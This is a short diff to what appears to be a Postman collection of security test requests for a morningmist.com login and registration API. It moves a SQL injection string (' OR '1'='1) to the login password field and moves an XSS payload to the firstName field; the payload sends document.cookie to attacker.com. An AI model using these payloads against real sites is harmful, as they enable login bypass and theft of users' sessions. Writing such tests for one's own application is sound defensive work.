@@ -1015,7 +1015,7 @@
             "header": [],
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"email\": \"admin@morningmist.com' OR '1'='1\",\n  \"password\": \"anything\"\n}",
+              "raw": "{\n  \"email\": \"admin@morningmist.com\",\n  \"password\": \"anything' OR '1'='1\"\n}",
               "options": {
                 "raw": {
                   "language": "json"
@@ -1050,7 +1050,7 @@
             ],
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"firstName\": \"Attacker\",\n  \"lastName\": \"XSS\",\n  \"email\": \"<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>\",\n  \"password\": \"password\"\n}",
+              "raw": "{\n  \"firstName\": \"<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>\",\n  \"lastName\": \"XSS\",\n  \"email\": \"attacker@morningmist.com\",\n  \"password\": \"password\"\n}",
               "options": {
                 "raw": {
                   "language": "json"
